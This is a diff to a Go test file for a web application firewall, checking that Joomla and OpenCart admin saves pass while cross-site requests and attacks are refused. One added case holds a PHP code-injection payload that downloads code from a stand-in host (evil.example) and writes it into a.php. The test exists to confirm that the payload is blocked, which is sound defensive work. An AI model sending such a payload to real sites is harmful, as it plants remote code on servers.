@@ -6,6 +6,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/xmarthost/xmartguard/agent/internal/settings"
 )
 
 // TestCustomerFalsePositivesWithCRS replays the kinds of requests customers
@@ -128,6 +130,24 @@ func TestCustomerFalsePositivesWithCRS(t *testing.T) {
 	}
 }
 
+// The admin-area lift reads the session cookie from the Cookie header:
+// LiteSpeed's engine does not fill the cookie collections reliably, so a
+// rule counting REQUEST_COOKIES never matched there (joomlashare.ir on
+// business600: Joomla administrator saves scoring 10-25 refused until
+// 0.23.28, and the owner banned for "15 WAF blocked").
+func TestAdminAreaReadsCookieHeader(t *testing.T) {
+	setup := adminAreaSetup()
+	if strings.Contains(setup, "REQUEST_COOKIES") || !strings.Contains(setup, `REQUEST_HEADERS:Cookie "@rx [^\s;=]+=[^\s;]"`) {
+		t.Fatalf("admin area setup:\n%s", setup)
+	}
+	c := settings.Defaults().WAF
+	c.Enabled = true
+	out := Render(c, Options{Dir: "/r"})
+	if ch := chainOf(out, IDAdminPanel); len(ch) == 0 || strings.Contains(strings.Join(ch, "\n"), "REQUEST_COOKIES") {
+		t.Fatalf("admin panel exclusion: %q", ch)
+	}
+}
+
 // Admin areas on LiteSpeed: its ModSecurity ignores ctl:ruleRemoveByTag, so
 // the admin-panel exclusion (7700018) does nothing there and a Joomla
 // administrator's saves were refused (business600, 2026-10-19). With that
@@ -153,10 +173,19 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 	}{
 		{"Joomla e-mail template", "joomla.example.ir", "/administrator/index.php?option=com_rsmembership&view=configuration", template, own, 200},
 		{"Joomla File Explorer save", "joomla.example.ir", "/administrator/index.php?option=com_ffexplorer&task=save", file, own, 200},
+		// joomlashare.ir (2026-10-21..25): jDownloads item saves scoring 25.
+		{"Joomla jDownloads item save", "joomla.example.ir", "/administrator/index.php?option=com_jdownloads&layout=edit&id=60",
+			"jform%5Bdescription%5D=" + urlEncode(`<div class="dl"><a href="#" onclick="return false">Download</a></div><pre>wget https://example.com/x.zip; ls -la</pre>`) +
+				"&jform%5Bnotes%5D=" + urlEncode(`php_value upload_max_filesize 64M`), own, 200},
 		{"OpenCart product description", "shop.example.pk", "/admin/index.php?route=catalog/product.save", template,
 			[]string{"Cookie: OCSESSID=abc123", "Sec-Fetch-Site: same-origin", "Referer: https://shop.example.pk/admin/index.php?route=catalog/product.form"}, 200},
 		{"Without the browser's same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_rsmembership&view=configuration", template, []string{joomla}, 403},
 		{"From another site", "joomla.example.ir", "/administrator/index.php", template, []string{joomla, "Sec-Fetch-Site: cross-site", "Referer: https://evil.example/administrator/"}, 403},
+		{"A cookie header without a value", "joomla.example.ir", "/administrator/index.php", template,
+			[]string{"Cookie: ;", "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php"}, 403},
+		// The attack the same site gets every day stays blocked (front end, as
+		// the attack tools send it).
+		{"Front-end code injection", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed", "x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`), nil, 403},
 		{"Customer dashboard is not an admin area", "smm.example.pk", "/dashboard/profile", template, []string{"Cookie: PHPSESSID=abc", "Sec-Fetch-Site: same-origin", "Referer: https://smm.example.pk/dashboard/"}, 403},
 	}
 	for _, c := range cases {
